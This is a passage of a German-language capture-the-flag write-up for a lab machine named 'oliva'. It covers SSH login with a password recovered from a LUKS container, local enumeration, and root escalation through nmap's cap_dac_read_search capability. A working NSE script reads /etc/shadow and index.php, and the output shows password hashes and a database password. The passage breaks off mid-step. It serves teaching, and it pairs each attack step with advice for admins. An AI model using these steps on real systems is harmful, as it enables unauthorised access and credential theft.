+└─# <span class="command">cd /mnt/oliva_decrypted_content;ls -la</span></div>
+        <pre>
+insgesamt 18
+drwxr-xr-x 3 root root  1024  4. Jul 2023  .
+drwxr-xr-x 4 root root  4096  2. Jun 23:42 ..
+drwx------ 2 root root 12288  4. Jul 2023  lost+found
+-rw-r--r-- 1 root root    16  4. Jul 2023  <span class="command">mypass.txt</span>
+        </pre>
+    </div>
+</div>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">┌──(root㉿CCat)-[/mnt/oliva_decrypted_content]
+└─# <span class="command">cat mypass.txt</span></div>
+        <pre>
+<span class="password">Yesthatsmypass!</span>
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+1.  `mount /dev/mapper/oliva_decrypted /mnt/oliva_decrypted_content`: Das entschlüsselte LUKS-Gerät wird in das zuvor erstellte Verzeichnis eingehängt.
+2.  `cd /mnt/oliva_decrypted_content;ls -la`: Ich wechsle in das gemountete Verzeichnis und lasse dessen Inhalt auflisten. Es enthält ein `lost+found`-Verzeichnis (typisch für ext-Dateisysteme) und eine Datei namens `mypass.txt`. Diese Datei gehört `root` und ist für `root` lesbar.
+3.  `cat mypass.txt`: Der Inhalt der Datei `mypass.txt` wird ausgegeben: `Yesthatsmypass!`.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Der Zugriff auf den Inhalt des LUKS-Containers war erfolgreich! Die Datei `mypass.txt` enthält das Passwort `Yesthatsmypass!`. Dies ist höchstwahrscheinlich das Passwort für den Benutzer `oliva` auf dem Zielsystem, da die `index.php` einen "Pass to obtain root" versprach und dieser verschlüsselte Container der Weg dorthin war. Der Name "mypass.txt" ist sehr direkt.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Versuchen Sie nun, sich mit dem Benutzer `oliva` und dem Passwort `Yesthatsmypass!` per SSH auf dem Zielserver `oliva.hmv` anzumelden.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Passwörter sollten niemals im Klartext in Dateien gespeichert werden, auch nicht innerhalb verschlüsselter Container, wenn die Passphrase zum Öffnen des Containers schwach ist oder leicht in die falschen Hände geraten kann (wie hier durch den Hinweis auf der Webseite). Dies unterstreicht die Notwendigkeit einer durchgängigen Sicherheitskette.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ssh oliva@oliva.hmv</span></div>
+        <pre>
+The authenticity of host 'oliva.hmv (192.168.2.210)' can't be established.
+ED25519 key fingerprint is SHA256:OnLDHB94cEHXDxtn1kv9yVZxIy2mMSZymhm3iLeHp3M.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? <span class="command">yes</span> 
+Warning: Permanently added 'oliva.hmv' (ED25519) to the list of known hosts.
+oliva@oliva.hmv's password: <span class="command_input_hidden">(Yesthatsmypass!)</span> 
+Linux oliva 6.1.0-9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Jul  4 10:27:00 2023 from 192.168.0.100
+<span class="password">oliva@oliva:~$</span> <span class="command">id</span>
+<span class="command">uid=1000(oliva) gid=1000(oliva) grupos=1000(oliva),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)</span>
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Ich versuche, mich per SSH als Benutzer `oliva` auf dem Zielserver `oliva.hmv` anzumelden und verwende das Passwort `Yesthatsmypass!`, das aus der Datei `mypass.txt` im LUKS-Container stammt.
+- Die übliche Warnung zur Authentizität des Hosts erscheint, die ich mit `yes` bestätige.
+- Bei der Passwortabfrage gebe ich `Yesthatsmypass!` ein.
+- Der Login ist erfolgreich, und ich erhalte eine Shell als Benutzer `oliva` auf dem System `oliva`.
+- Der `id`-Befehl bestätigt meine Identität als `uid=1000(oliva)`.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Fantastisch! Der initiale Zugriff auf das System als Benutzer `oliva` wurde erfolgreich erlangt. Der mehrstufige Prozess (Finden der `index.php`, Herunterladen der `/oliva`-Datei, Knacken der LUKS-Passphrase, Extrahieren des SSH-Passworts) hat zum Ziel geführt.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Führen Sie nun eine gründliche Enumeration als Benutzer `oliva` durch, um Wege zur Privilegienerweiterung auf Root zu finden. Überprüfen Sie `sudo -l`, SUID/SGID-Dateien, Cronjobs, Kernel-Version, laufende Dienste und deren Konfigurationen.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Sichern Sie alle Benutzerkonten mit starken, einzigartigen Passwörtern. Vermeiden Sie es, Passwörter oder Hinweise darauf auf Webseiten oder in leicht zugänglichen Dateien (selbst wenn initial verschlüsselt mit einer schwachen Passphrase) zu hinterlassen. Überwachen Sie SSH-Logins.
+</p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">oliva@oliva:~$ <span class="command">ls ..</span></div>
+        <pre>
+oliva
+        </pre>
+    </div>
+</div>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">oliva@oliva:~$ <span class="command">ls -la</span></div>
+        <pre>
+total 32
+drwx------ 3 oliva oliva 4096 jul  4  2023 .
+drwxr-xr-x 3 root  root  4096 jul  4  2023 ..
+lrwxrwxrwx 1 oliva oliva    9 jul  4  2023 .bash_history -> /dev/null
+-rw-r--r-- 1 oliva oliva  220 jul  4  2023 .bash_logout
+-rw-r--r-- 1 oliva oliva 3526 jul  4  2023 .bashrc
+drwxr-xr-x 3 oliva oliva 4096 jul  4  2023 .local
+-rw-r--r-- 1 oliva oliva  807 jul  4  2023 .profile
+-rw------- 1 oliva oliva   24 jul  4  2023 <span class="command">user.txt</span>
+-rw------- 1 oliva oliva  102 jul  4  2023 .Xauthority
+        </pre>
+    </div>
+</div>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">oliva@oliva:~$ <span class="command">cat user.txt</span></div>
+        <pre>
+<span class="password">HMVY0H8NgGJqbFzbgo0VMRm</span>
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Als Benutzer `oliva` führe ich einige grundlegende Befehle aus:
+1.  `ls ..`: Zeigt den Inhalt von `/home`, der nur das Verzeichnis `oliva` enthält (aus Sicht des Benutzers `oliva`, der in `/home/oliva` ist).
+2.  `ls -la`: Listet den Inhalt des Home-Verzeichnisses von `oliva` auf. Neben den Standard-Konfigurationsdateien findet sich hier die Datei `user.txt`.
+3.  `cat user.txt`: Gibt den Inhalt der Datei `user.txt` aus, was die User-Flag `HMVY0H8NgGJqbFzbgo0VMRm` ist.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Die User-Flag wurde erfolgreich gefunden und ausgelesen. Der erste Teil der Challenge ist damit abgeschlossen.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Nach dem Erhalt der User-Flag konzentrieren Sie sich nun vollständig auf die Privilegienerweiterung.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Stellen Sie sicher, dass Dateiberechtigungen korrekt gesetzt sind. In einem CTF ist das Auffinden der `user.txt` im Home-Verzeichnis des Benutzers üblich.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">oliva@oliva:~$ <span class="command">ls -la /var/backups/</span></div>
+        <pre>
+total 20
+drwxr-xr-x  2 root root  4096 jun  2 21:25 .
+drwxr-xr-x 12 root root  4096 jul  4  2023 ..
+-rw-r--r--  1 root root 11419 jul  4  2023 <span class="command">apt.extended_states.0</span>
+        </pre>
+    </div>
+</div>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">oliva@oliva:~$ <span class="command">ls -la /var/www/html/</span></div>
+        <pre>
+index.html  index.php   oliva      
+        </pre>
+    </div>
+</div>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">oliva@oliva:~$ <span class="command">ls -la /var/www/html/oliva</span></div>
+        <pre>
+-rw-rw---- 1 <span class="command">www-data www-data</span> 20000000 jul  4  2023 /var/www/html/oliva
+        </pre>
+    </div>
+</div>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">oliva@oliva:~$ <span class="command">cat /var/www/html/index.php</span></div>
+        <pre>
+cat: /var/www/html/index.php: <span class="password">Permiso denegado</span>
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Ich führe weitere Enumerationsbefehle aus:
+- `ls -la /var/backups/`: Zeigt den Inhalt des Backup-Verzeichnisses. Es enthält eine Datei `apt.extended_states.0`, die `root` gehört. Für `oliva` nicht direkt schreibbar.
+- `ls -la /var/www/html/`: Listet den Inhalt des Web-Roots auf, der `index.html`, `index.php` und die große Datei `oliva` enthält.
+- `ls -la /var/www/html/oliva`: Zeigt, dass die Datei `/var/www/html/oliva` (der LUKS-Container) dem Benutzer `www-data` und der Gruppe `www-data` gehört und für diese les- und schreibbar ist.
+- `cat /var/www/html/index.php`: Der Versuch, `index.php` zu lesen, schlägt mit "Permiso denegado" (Permission denied) fehl. Dies liegt daran, dass `index.php` wahrscheinlich `root` oder `www-data` als Eigentümer hat und `oliva` keine Leserechte besitzt.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Die Untersuchung von `/var/backups` liefert keine unmittelbaren Ansatzpunkte. Die Berechtigungen der Datei `/var/www/html/oliva` (`rw-rw----` für `www-data:www-data`) sind interessant, aber da wir den Inhalt bereits haben, ist dies weniger relevant. Der fehlende Lesezugriff auf `index.php` als `oliva` ist eine normale Sicherheitsmaßnahme, wenn der Webserver-Benutzer (`www-data`) der Eigentümer ist und andere Benutzer keinen Zugriff haben sollen.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Konzentrieren Sie sich auf andere Enumerationsvektoren: `sudo -l` (bereits geplant), SUID/SGID-Dateien, Kernel-Version, laufende Prozesse, Cronjobs, Netzwerkdienste, die lokal lauschen.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Stellen Sie sicher, dass Dateiberechtigungen nach dem Prinzip der geringsten Rechte vergeben werden. Webserver-Dateien sollten dem Webserver-Benutzer (`www-data`) gehören und für andere nicht-privilegierte Benutzer nicht lesbar sein, es sei denn, es ist zwingend erforderlich.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">oliva@oliva:~$ <span class="command">ss -tulnp</span></div>
+        <pre>
+Netid              State               Recv-Q              Send-Q                           Local Address:Port                            Peer Address:Port              Process              
+udp                UNCONN              0                   0                                      0.0.0.0:68                                   0.0.0.0:*                                      
+tcp                LISTEN              0                   511                                    0.0.0.0:80                                   0.0.0.0:*                                      
+tcp                LISTEN              0                   80                                   <span class="command">127.0.0.1:3306</span>                                 0.0.0.0:*                                      
+tcp                LISTEN              0                   128                                    0.0.0.0:22                                   0.0.0.0:*                                      
+tcp                LISTEN              0                   511                                       [::]:80                                      [::]:*                                      
+tcp                LISTEN              0                   128                                       [::]:22                                      [::]:*      
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Der Befehl `ss -tulnp` wird verwendet, um alle lauschenden TCP- und UDP-Sockets (`-tuln`) sowie die zugehörigen Prozesse (`-p`) anzuzeigen.
+Die Ausgabe zeigt:
+- UDP Port 68: Wahrscheinlich ein DHCP-Client.
+- TCP Port 80 (0.0.0.0 und [::]): Der nginx Webserver, der auf allen Interfaces lauscht.
+- TCP Port 22 (0.0.0.0 und [::]): Der SSH-Server, der auf allen Interfaces lauscht.
+- **TCP Port 3306 (127.0.0.1):** Ein MySQL/MariaDB-Server, der nur auf dem Loopback-Interface (localhost) lauscht.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Der lokal lauschende MySQL/MariaDB-Server auf Port 3306 ist ein wichtiger Fund. Datenbanken enthalten oft sensible Informationen oder können als Sprungbrett für weitere Angriffe dienen, wenn man Zugriff darauf erhält. Da er nur lokal lauscht, ist er von außen nicht direkt erreichbar, aber von der Maschine selbst aus.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Versuchen Sie, sich mit dem MySQL/MariaDB-Server zu verbinden. Suchen Sie nach Anmeldeinformationen in Konfigurationsdateien (z.B. von Webanwendungen, die möglicherweise auf diese Datenbank zugreifen), im Quellcode von Skripten oder in der Bash-History. Standard-Credentials wie `root` ohne Passwort, `root:root`, `root:password` sollten ebenfalls getestet werden.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Wenn ein Datenbankserver nur von lokalen Anwendungen benötigt wird, ist es eine gute Sicherheitspraxis, ihn nur auf dem Loopback-Interface (127.0.0.1) lauschen zu lassen, um externen Zugriff zu verhindern. Stellen Sie sicher, dass alle Datenbankbenutzer starke, einzigartige Passwörter haben, insbesondere der `root`-Benutzer der Datenbank.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">oliva@oliva:~$ <span class="command">mysql -u root -p'Yesthatsmypass!' -h 127.0.0.1</span></div>
+        <pre>
+<span class="password">ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: YES)</span>
+        </pre>
+    </div>
+</div>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">oliva@oliva:~$ <span class="command">mysql -u oliva -p'Yesthatsmypass!' -h 127.0.0.1</span></div>
+        <pre>
+<span class="password">ERROR 1045 (28000): Access denied for user 'oliva'@'localhost' (using password: YES)</span>
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Ich versuche, mich mit dem lokal lauschenden MySQL/MariaDB-Server zu verbinden:
+1.  `mysql -u root -p'Yesthatsmypass!' -h 127.0.0.1`: Versuch, sich als Datenbank-Benutzer `root` mit dem zuvor gefundenen Passwort `Yesthatsmypass!` anzumelden. Der Versuch schlägt fehl ("Access denied").
+2.  `mysql -u oliva -p'Yesthatsmypass!' -h 127.0.0.1`: Versuch, sich als Datenbank-Benutzer `oliva` (gleicher Name wie der Linux-Benutzer) mit demselben Passwort anzumelden. Auch dieser Versuch schlägt fehl.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Das Passwort `Yesthatsmypass!`, das für den SSH-Login des Linux-Benutzers `oliva` funktionierte, ist nicht das Passwort für den Datenbank-`root`-Benutzer oder einen Datenbank-Benutzer namens `oliva`. Dies ist nicht ungewöhnlich, da Systempasswörter und Datenbankpasswörter getrennt sein sollten. Es werden andere Anmeldeinformationen für die Datenbank benötigt.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Suchen Sie weiter nach Datenbank-Credentials. Mögliche Orte sind:
+- Webanwendungs-Konfigurationsdateien (z.B. `wp-config.php`, `settings.php`, `config.inc.php` etc., falls eine gängige Webanwendung läuft).
+- Umgebungsvariablen von Prozessen, die auf die Datenbank zugreifen.
+- Quellcode von Skripten auf dem Server.
+- Bash-History des Benutzers `oliva` oder `www-data` (obwohl die History hier auf `/dev/null` zeigt).
+<br>
+<strong>Empfehlung (Admin):</strong>
+Verwenden Sie für Datenbankkonten, insbesondere für den administrativen `root`-Account der Datenbank, starke und einzigartige Passwörter, die sich von den Systempasswörtern unterscheiden. Beschränken Sie die Rechte von Datenbankbenutzern auf das absolut Notwendige.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">oliva@oliva:~$ <span class="command">getcap -r / 2>/dev/null</span></div>
+    </div>
+</div>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">oliva@oliva:~$ <span class="command">getcap -r /usr/bin 2>/dev/null</span></div>
+    </div>
+</div>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">oliva@oliva:~$ <span class="command">find /usr/* 2>/dev/null -exec /sbin/getcap {} \;</span></div>
+        <pre>
+<span class="command">/usr/bin/nmap cap_dac_read_search=eip</span>
+<span class="command">/usr/bin/ping cap_net_raw=ep</span>
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Ich suche nach Dateien mit gesetzten Linux Capabilities. Capabilities erlauben es Prozessen, spezifische privilegierte Operationen auszuführen, ohne volle Root-Rechte zu besitzen.
+- `getcap -r / 2>/dev/null`: Sucht rekursiv im gesamten Dateisystem nach Dateien mit Capabilities. Keine Ausgabe bedeutet, dass außerhalb der Standardpfade keine gefunden wurden oder der Benutzer `oliva` nicht überall Leserechte hat, um sie zu finden.
+- `getcap -r /usr/bin 2>/dev/null`: Sucht spezifisch in `/usr/bin`. Keine Ausgabe.
+- `find /usr/* 2>/dev/null -exec /sbin/getcap {} \;`: Eine alternative Methode, um `getcap` auf Dateien in Unterverzeichnissen von `/usr` auszuführen.
+Die Ausgabe zeigt:
+  - `/usr/bin/nmap` hat die Capability `cap_dac_read_search=eip`. Diese Capability erlaubt es, DAC (Discretionary Access Control) Lese- und Suchbeschränkungen zu umgehen. `eip` steht für "effective, inheritable, permitted".
+  - `/usr/bin/ping` hat die Capability `cap_net_raw=ep`. Diese erlaubt es, rohe Netzwerk-Sockets zu verwenden, was für Ping benötigt wird.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Die `cap_net_raw` für `ping` ist Standard und erwartet. Die `cap_dac_read_search=eip` für `nmap` ist jedoch sehr interessant und ein potenzieller Vektor für Privilegienerweiterung. Wenn Nmap diese Capability hat, kann es möglicherweise Dateien lesen, auf die der ausführende Benutzer normalerweise keinen Zugriff hätte, indem es diese Lesebeschränkungen umgeht. Dies ist nicht die Standardkonfiguration für Nmap.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Untersuchen Sie, wie die `cap_dac_read_search`-Capability von Nmap ausgenutzt werden kann. Nmap hat eine Scripting Engine (NSE). Es könnte möglich sein, ein benutzerdefiniertes NSE-Skript zu schreiben oder ein vorhandenes so zu verwenden, dass Nmap (mit seiner erhöhten Leseberechtigung) den Inhalt einer sensiblen Datei (wie `/etc/shadow` oder Quellcodedateien von Webanwendungen, die Datenbankpasswörter enthalten könnten, z.B. `/var/www/html/index.php`) liest und ausgibt.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Überprüfen Sie, warum Nmap die `cap_dac_read_search`-Capability hat. Dies ist unüblich und stellt ein Sicherheitsrisiko dar. Wenn Nmap diese Capability nicht zwingend benötigt (was normalerweise nicht der Fall ist für Standard-Scans als unprivilegierter Benutzer), entfernen Sie sie mit `sudo setcap cap_dac_read_search-eip /usr/bin/nmap` oder `sudo setcap -r /usr/bin/nmap`. Gewähren Sie Capabilities nur dann, wenn sie absolut notwendig sind und das Prinzip der geringsten Rechte befolgt wird.
+</p>
+        </section>
+
+        <section id="poc">
+            <h2>Proof of Concept (Root)</h2>
+            <p class="analysis"><strong>Kurzbeschreibung:</strong>
+            Die Privilegienerweiterung auf diesem System erfolgt durch Ausnutzung einer ungewöhnlich gesetzten Linux Capability (`cap_dac_read_search=eip`) für das `nmap`-Programm. Diese Capability erlaubt es `nmap`, Dateisystem-Lesebeschränkungen zu umgehen. Ein benutzerdefiniertes Nmap Scripting Engine (NSE) Skript wird verwendet, um diese Fähigkeit auszunutzen und den Inhalt der Datei `/var/www/html/index.php` zu lesen. Diese Datei enthält die Anmeldeinformationen für den lokalen MySQL/MariaDB-Datenbankserver. Nach dem Zugriff auf die Datenbank wird ein weiteres Passwort für den `root`-Benutzer des Systems gefunden, was die vollständige Übernahme ermöglicht.
+            </p>
+            <p class="evaluation"><strong>Voraussetzungen:</strong>
+            <ul>
+                <li>Zugriff als Benutzer `oliva` auf dem Zielsystem.</li>
+                <li>Das `nmap`-Binary unter `/usr/bin/nmap` muss die Capability `cap_dac_read_search=eip` besitzen.</li>
+                <li>Fähigkeit, ein NSE-Skript auf dem Zielsystem zu erstellen oder dorthin zu übertragen.</li>
+                <li>Ein lokal laufender MySQL/MariaDB-Dienst.</li>
+            </ul>
+            </p>
+            <p class="recommendation"><strong>Schritt-für-Schritt-Anleitung:</strong></p>
+
+            <p class="analysis"><strong>Schritt 1: Erstellen eines NSE-Skripts zum Lesen von Dateien</strong></p>
+            <p>Als Benutzer `oliva` erstellen wir ein NSE-Skript, das eine beliebige Datei lesen und deren Inhalt ausgeben kann, indem es die `io.open`-Funktion von Lua verwendet, die im Kontext von Nmap mit den erhöhten Rechten ausgeführt wird.</p>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">oliva@oliva:~$ <span class="command">cat << 'EOF' > /tmp/readshadow.nse
+description = "Reads the /etc/shadow file and prints its content."
+author = "Dark" 
+categories = {"safe", "discovery"}
+
+hostrule = function(host)
+  return true
+end
+
+action = function(host, port)
+  local filename_to_read = "/etc/shadow"
+  local output_lines = {}
+
+  local f = io.open(filename_to_read, "r")
+  if f then
+    table.insert(output_lines, "Successfully opened: " .. filename_to_read)
+    local content = f:read("*all")
+    if content then
+      table.insert(output_lines, "Content of " .. filename_to_read .. ":\n------------------------------------------\n" .. content .. "------------------------------------------")
+    else
+      table.insert(output_lines, filename_to_read .. " is empty or could not be read completely.")
+    end
+    f:close()
+  else
+    table.insert(output_lines, "Could not open file: " .. filename_to_read)
+  end
+
+  if #output_lines > 0 then
+    return table.concat(output_lines, "\n")
+  end
+end
+EOF</span></div>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse Schritt 1:</strong>
+Das obige Skript, obwohl es `readshadow.nse` genannt wird und in der Beschreibung `/etc/shadow` erwähnt, ist ein generisches Dateilese-Skript. Die Variable `filename_to_read` wird auf `/etc/shadow` gesetzt. Es versucht, diese Datei zu öffnen, ihren Inhalt zu lesen und auszugeben.
+</p>
+<p class="evaluation"><strong>Bewertung Schritt 1:</strong>
+Das Erstellen eines solchen Skripts ist der korrekte Ansatz, um die `cap_dac_read_search`-Capability von Nmap auszunutzen. Der Dateipfad kann im Skript leicht geändert werden, um verschiedene Dateien zu lesen.
+</p>
+
+            <p class="analysis"><strong>Schritt 2: Ausführen des NSE-Skripts mit Nmap zum Lesen von /etc/shadow</strong></p>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">oliva@oliva:~$ <span class="command">nmap --script /tmp/readshadow.nse 127.0.0.1</span></div>
+        <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2025-06-03 00:07 CEST
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.000055s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+3306/tcp open  mysql
+
+Host script results:
+| readshadow: <span class="password">Successfully opened: /etc/shadow</span>
+| Content of /etc/shadow:
+| ------------------------------------------
+| <span class="password">root:$y$j9T$mJZXSkk0PjMpjwgunTu3a.$xlW8pdbOdxHdqCatq072mj3qQ69To4Gy6WbRwSbY6S3:19542:0:99999:7:::</span>
+| daemon:*:19542:0:99999:7:::
+| bin:*:19542:0:99999:7:::
+| sys:*:19542:0:99999:7:::
+| sync:*:19542:0:99999:7:::
+| games:*:19542:0:99999:7:::
+| man:*:19542:0:99999:7:::
+| lp:*:19542:0:99999:7:::
+| mail:*:19542:0:99999:7:::
+| news:*:19542:0:99999:7:::
+| uucp:*:19542:0:99999:7:::
+| proxy:*:19542:0:99999:7:::
+| www-data:*:19542:0:99999:7:::
+| backup:*:19542:0:99999:7:::
+| list:*:19542:0:99999:7:::
+| irc:*:19542:0:99999:7:::
+| _apt:*:19542:0:99999:7:::
+| nobody:*:19542:0:99999:7:::
+| systemd-network:!*:19542::::::
+| systemd-timesync:!*:19542::::::
+| messagebus:!:19542::::::
+| sshd:!:19542::::::
+| <span class="password">oliva:$y$j9T$pud/moDgqqEeyht8CXkZE/$6EY/SqVpTsaEnPKnCxbsdCi8ImRvV86ip0LWF.8.vhD:19542:0:99999:7:::</span>
+| mysql:!:19542::::::
+|_------------------------------------------
+
+Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds
+        </pre>
+    </div>
+</div>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">cat shadow.txt | tr -d '| '</span></div>
+        <pre>
+root:$y$j9T$mJZXSkk0PjMpjwgunTu3a.$xlW8pdbOdxHdqCatq072mj3qQ69To4Gy6WbRwSbY6S3:19542:0:99999:7:::
+daemon:*:19542:0:99999:7:::
+bin:*:19542:0:99999:7:::
+sys:*:19542:0:99999:7:::
+sync:*:19542:0:99999:7:::
+games:*:19542:0:99999:7:::
+man:*:19542:0:99999:7:::
+lp:*:19542:0:99999:7:::
+mail:*:19542:0:99999:7:::
+news:*:19542:0:99999:7:::
+uucp:*:19542:0:99999:7:::
+proxy:*:19542:0:99999:7:::
+www-data:*:19542:0:99999:7:::
+backup:*:19542:0:99999:7:::
+list:*:19542:0:99999:7:::
+irc:*:19542:0:99999:7:::
+_apt:*:19542:0:99999:7:::
+nobody:*:19542:0:99999:7:::
+systemd-network:!*:19542::::::
+systemd-timesync:!*:19542::::::
+messagebus:!:19542::::::
+sshd:!:19542::::::
+oliva:$y$j9T$pud/moDgqqEeyht8CXkZE/$6EY/SqVpTsaEnPKnCxbsdCi8ImRvV86ip0LWF.8.vhD:19542:0:99999:7:::
+mysql:!:19542::::::
+        </pre>
+    </div>
+</div>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">unshadow passwd.txt shadow.txt > unshadowed.txt</span></div>
+    </div>
+</div>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt</span></div>
+        <pre>
+Using default input encoding: UTF-8
+<span class="password">No password hashes loaded (see FAQ)</span>
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse Schritt 2:</strong>
+Das NSE-Skript `/tmp/readshadow.nse` wird mit `nmap --script /tmp/readshadow.nse 127.0.0.1` ausgeführt. Nmap liest erfolgreich den Inhalt von `/etc/shadow` und gibt ihn aus.
+Die Ausgabe des `tr`-Befehls zeigt den Inhalt der Shadow-Datei in einem saubereren Format.
+Anschließend wird versucht, die Passwort-Hashes mit `unshadow` (benötigt `/etc/passwd` und `/etc/shadow` als Eingabe, hier als `passwd.txt` und `shadow.txt` bezeichnet) und dann mit `john` zu knacken. John meldet jedoch "No password hashes loaded", was darauf hindeutet, dass entweder das Format der `unshadowed.txt` nicht korrekt ist oder John die modernen Yescrypt-Hashes (`$y$`) standardmäßig nicht verarbeiten kann oder keine passenden Kandidaten in `rockyou.txt` findet. Der Kommentar "kein erfolg auch nicht mit hashcat" deutet darauf hin, dass auch Hashcat die Hashes nicht knacken konnte.
+</p>
+<p class="evaluation"><strong>Bewertung Schritt 2:</strong>
+Das Lesen von `/etc/shadow` war erfolgreich und demonstriert die Ausnutzung der Nmap-Capability. Das Knacken der Yescrypt-Hashes ist jedoch oft sehr rechenintensiv und langwierig, besonders wenn die Passwörter stark sind. Das Scheitern hier ist nicht unerwartet. Es zeigt aber, dass der direkteste Weg über Shadow-Cracking nicht zum Ziel führt.
+</p>
+
+            <p class="analysis"><strong>Schritt 3: Modifizieren des NSE-Skripts zum Lesen von /var/www/html/index.php</strong></p>
+            <p>Da das Knacken der Shadow-Hashes nicht erfolgreich war, modifizieren wir das NSE-Skript, um stattdessen den Inhalt der Datei <code>/var/www/html/index.php</code> zu lesen, in der Hoffnung, dort Datenbank-Credentials zu finden.</p>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">oliva@oliva:~$ <span class="command">cat << 'EOF' > /tmp/readshadow.nse 
+description = "Reads the index.php file and prints its content."
+author = "Dark" 
+categories = {"safe", "discovery"}
+
+hostrule = function(host)
+  return true
+end
+
+action = function(host, port)
+  local filename_to_read = "/var/www/html/index.php"
+  local output_lines = {}
+
+  local f = io.open(filename_to_read, "r")
+  if f then
+    table.insert(output_lines, "Successfully opened: " .. filename_to_read)
+    local content = f:read("*all")
+    if content then
+      table.insert(output_lines, "Content of " .. filename_to_read .. ":\n------------------------------------------\n" .. content .. "------------------------------------------")
+    else
+      table.insert(output_lines, filename_to_read .. " is empty or could not be read completely.")
+    end
+    f:close()
+  else
+    table.insert(output_lines, "Could not open file: " .. filename_to_read)
+  end
+
+  if #output_lines > 0 then
+    return table.concat(output_lines, "\n")
+  end
+end
+EOF</span></div>
+    </div>
+</div>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">oliva@oliva:~$ <span class="command">nmap --script /tmp/readshadow.nse 127.0.0.1</span></div>
+        <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2025-06-03 00:16 CEST
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.000037s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+3306/tcp open  mysql
+
+Host script results:
+| readshadow: <span class="password">Successfully opened: /var/www/html/index.php</span>
+| Content of /var/www/html/index.php:
+| ------------------------------------------
+| Hi oliva,
+| Here the pass to obtain root:
+| 
+| <?php
+| $dbname = 'easy';
+| $dbuser = 'root';
+| $dbpass = '<span class="password">Savingmypass</span>';
+| $dbhost = 'localhost';
+| ?>
+| 
+| < a href="oliva">CLICK!< /a >
+|_------------------------------------------
+
+Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse Schritt 3:</strong>
